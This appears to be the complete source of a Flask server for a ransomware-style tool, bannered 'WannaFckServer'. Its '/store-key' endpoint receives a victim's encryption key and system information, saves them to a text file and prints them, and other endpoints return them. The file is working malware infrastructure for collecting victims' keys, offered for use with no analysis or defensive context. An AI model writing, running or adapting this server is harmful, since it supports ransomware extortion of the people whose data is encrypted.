banner = r"""
 __      __                             ___________     __      _________
/  \    /  \_____    ____   ____ _____  \_   _____/___ |  | __ /   _____/ ______________  __ ___________
\   \/\/   /\__  \  /    \ /    \\__  \  |    __)/ ___\|  |/ / \_____  \_/ __ \_  __ \  \/ // __ \_  __ \
 \        /  / __ \|   |  \   |  \/ __ \_|     \\  \___|    <  /        \  ___/|  | \/\   /\  ___/|  | \/
  \__/\  /  (____  /___|  /___|  (____  /\___  / \___  >__|_ \/_______  /\___  >__|    \_/  \___  >__|
       \/        \/     \/     \/     \/     \/      \/     \/        \/     \/                 \/
                                                                            - Kura1yume (A1SBERG)
"""
from flask import Flask, request, jsonify
import os
import signal

app = Flask(__name__)
data_store = {}
file_name_output = 'SystemandKey.txt'

def save_data_to_file():
    with open(file_name_output, 'w') as f:
        f.write(f"Key: {data_store.get('key', 'N/A')}\n")
        f.write("System Information:\n")
        system_info = data_store.get('system_info', {})
        for k, v in system_info.items():
            f.write(f" {k}: {v}\n")

@app.route('/store-key', methods=['POST'])
def store_key():
    key_data = request.get_json()
    key = key_data.get('key')
    system_info = key_data.get('system_info')
    if key and system_info:
        data_store['key'] = key
        data_store['system_info'] = system_info
        save_data_to_file()
        print(f"Key: {key}")
        print("System Information:")
        for k, v in system_info.items():
            print(f" {k}: {v}")
        shutdown_server()
        return jsonify({"message": "Key and system information stored successfully"}), 200
    return jsonify({"error": "Key or system information is missing"}), 400

@app.route('/get-key', methods=['GET'])
def get_key():
    key = data_store.get('key')
    if key:
        return jsonify({"key": key}), 200
    return jsonify({"error": "Key not found"}), 404

@app.route('/get-system-info', methods=['GET'])
def get_system_info():
    system_info = data_store.get('system_info')
    if system_info:
        return jsonify({"system_info": system_info}), 200
    return jsonify({"error": "System information not found"}), 404

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    else:
        os.kill(os.getpid(), signal.SIGINT)

if __name__ == '__main__':
    print(banner)
    app.run(host='0.0.0.0', port=5000, debug=False)
